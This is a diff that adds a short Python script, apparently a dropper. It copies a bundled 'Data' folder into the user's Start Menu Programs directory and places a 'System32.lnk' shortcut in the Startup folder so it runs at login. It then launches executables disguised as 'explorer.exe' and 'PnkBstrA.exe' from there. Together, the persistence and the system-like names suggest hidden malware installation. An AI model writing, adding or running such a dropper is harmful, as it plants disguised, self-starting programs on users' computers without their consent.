@@ -1,0 +1,17 @@
+import os
+import shutil
+import subprocess
+
+data_dir = os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Data")
+menu_dir = os.path.expandvars(r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+dest_dir = os.path.join(data_dir, r'Data')
+if not os.path.exists(data_dir):
+    os.mkdir(data_dir)
+
+if os.path.exists(dest_dir):
+    shutil.rmtree(dest_dir)
+
+shutil.copytree(r"Data", dest_dir)
+shutil.copy(r"System32.lnk", menu_dir)
+subprocess.Popen([r'C:\Users\Spanjer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Data\Data\explorer.exe'], cwd=data_dir)
+subprocess.call([r'C:\Users\Spanjer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Data\Data\PnkBstrA.exe'], cwd=data_dir)
